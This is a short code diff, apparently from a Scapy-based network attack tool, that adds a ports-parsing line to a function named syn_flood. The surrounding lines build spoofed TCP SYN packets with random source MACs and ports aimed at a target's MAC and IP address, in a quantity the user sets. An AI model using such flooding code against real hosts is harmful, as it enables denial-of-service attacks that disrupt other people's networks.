@@ -12,6 +12,7 @@ def syn_flood(values):
     variable_input(valid_var, help_statement, values)
     all_variables_inputted(values, valid_var)
     check_var(values, valid_var)
+    ports = values.get("ports")[:-1]
     template = (Ether(src=RandMAC(), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
     ns = []
     pktAmt = int(values.get("quantity"))
